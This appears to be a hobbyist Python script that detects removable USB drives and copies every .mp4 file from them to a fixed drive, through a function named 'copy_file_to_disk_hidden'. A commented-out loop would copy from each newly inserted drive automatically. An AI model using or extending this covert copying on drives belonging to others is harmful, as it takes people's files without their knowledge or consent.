# -*- coding:utf-8 -*-
import psutil
import sys
import os
import time
from datetime import datetime
import shutil
import re

"""全局数据 实时更新"""
local_device = []  # 本地硬盘
local_letter = []  # 本地盘符
local_number = 0  # 本地硬盘数
local_cdrom = []
local_cdrom_letter = []
local_cdrom_number = 0
mobile_device = []  # 移动设备
mobile_letter = []  # 移动设备盘符
mobile_number = 0  # 移动设备数


def updata():
    global local_device, local_letter, local_number, mobile_device, \
        mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number

    # 引入全局变量
    tmp_local_device, tmp_local_letter = [], []
    tmp_mobile_device, tmp_mobile_letter = [], []
    tmp_local_cdrom, tmp_local_cdrom_letter = [], []
    tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number = 0, 0, 0

    try:
        part = psutil.disk_partitions()
        # print(part)
    except:
        print("程序发生异常!!!")
        sys.exit(-1)
    else:
        # print(part)
        # 驱动器分类
        for i in range(len(part)):
            tmplist = part[i].opts.split(",")
            # print(tmplist)
            if "fixed" in tmplist:  # 挂载选项数据内读到fixed = 本地设备
                tmp_local_number = tmp_local_number + 1
                tmp_local_letter.append(part[i].device[:2])  # 得到盘符信息
                tmp_local_device.append(part[i])
            elif "cdrom" in tmplist:
                tmp_local_cdrom_number = tmp_local_cdrom_number + 1
                tmp_local_cdrom_letter.append(part[i].device[:2])
                tmp_local_cdrom.append(part[i])
            else:
                tmp_mobile_number = tmp_mobile_number + 1
                tmp_mobile_letter.append(part[i].device[:2])
                tmp_mobile_device.append(part[i])

        # 浅切片
        local_device, local_letter = tmp_local_device[:], tmp_local_letter[:]
        mobile_device, mobile_letter = tmp_mobile_device[:], tmp_mobile_letter[:]
        local_number, mobile_number, local_cdrom_number = tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number
        local_cdrom, local_cdrom_letter = tmp_local_cdrom[:], tmp_local_cdrom_letter[:]
    return len(part)  # 返回当前驱动器数


def print_device(n):
    global local_device, local_letter, local_number, mobile_device, mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number
    print("读取到" + str(n) + "个驱动器磁盘")

    print("------->", end="")
    for l in range(local_number):
        print(local_letter[l], end="")  # 列出本地驱动器盘符
    print("是本地硬盘")

    print("------->", end="")
    for l in range(local_cdrom_number):
        print(local_cdrom_letter[l], end="")  # 列出本地驱动器盘符
    print("是CD驱动器")

    if len(mobile_device):  # 列出移动驱动器盘符
        print("------->", end="")
        for m in range(mobile_number):
            print(mobile_letter[m], end="")
            print("是插入的移动磁盘...")
    else:
        pass
    print("进程进入监听状态 " + "*" * 10)
    return


def list_all_files(rootdir):
    _files = []
    files = os.listdir(rootdir) #列出文件夹下所有的目录与文件
    # print(files)
    for i in range(0,len(files)):
           path = os.path.join(rootdir,files[i])
           if os.path.isdir(path):
              _files.extend(list_all_files(path))
           if os.path.isfile(path):
              _files.append(path)
    return _files

def mkdir(path):
 
    folder = os.path.exists(path)
 
    if not folder:                   #判断是否存在文件夹如果不存在则创建为文件夹
        os.makedirs(path)            #makedirs 创建文件时如果路径不存在会创建这个路径
        print( "---  new folder...  ---")
 
    else:
        print( "---  There is this folder!  ---")


def copy_file_to_disk_hidden(FILE_PATH , SAVE_PATH):
    # U盘的盘符
    file_path = FILE_PATH
    save_path = SAVE_PATH  + "\\" +"U盘_"+FILE_PATH[0] + "_copy" 

    pattern = Path + r'(.*?)(.*)\\'
    mm = re.findall(pattern, file_path )
    # print(file_path, mm[0][1])
    if mm:
        create_file = '\\'  + mm[0][1]
        save_path = save_path + create_file

    if os.path.exists(file_path):
        # shutil.copy(file_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
        if mm:
            mkdir(save_path )

        shutil.copy(file_path, save_path )
    else:
        print("path not exist")


if __name__ == "__main__":
    # 初次读取驱动器信息，打印驱动器详细
    SAVE_PATH = "G:"
    print("start --> save path is" , SAVE_PATH)
    now_number = 0  # 实时驱动数
    before_number = updata()  # 更新数据之前的驱动数
    print("=" * 50 + "\n time is : " + str(datetime.now()))
    print_device(before_number)

    print(mobile_letter)

    for Path in mobile_letter:
        f = list_all_files(Path) 
        print('------>' )
        for i in range(0 , len(f)):
            ff = f[i].split('\\')[-1]
            if ff.split('.')[-1] == 'mp4' :
                print(f[i])
                copy_file_to_disk_hidden(f[i] , SAVE_PATH )

    # print((mobile_letter))
    # 进程进入循环 Loop Seconds = 1s
    # while True:
    #     now_number = updata()
    #     if now_number > before_number:
    #         print("=" * 50 + " \n检测到移动磁盘被插入...此刻时间是: " + str(datetime.now()))
    #         print_device(now_number)
    #         if len(mobile_device):  # 列出移动驱动器盘符
    #             for m in range(mobile_number):
    #                 copy_file_to_disk_hidden(mobile_letter[m])
    #         else:
    #             pass
    #         before_number = now_number  # 刷新数据
    #     elif now_number < before_number:
    #         print("=" * 50 + " \n检测到移动磁盘被拔出...此刻时间是: " + str(datetime.now()))
    #         print_device(now_number)
    #         before_number = now_number
    #     time.sleep(1)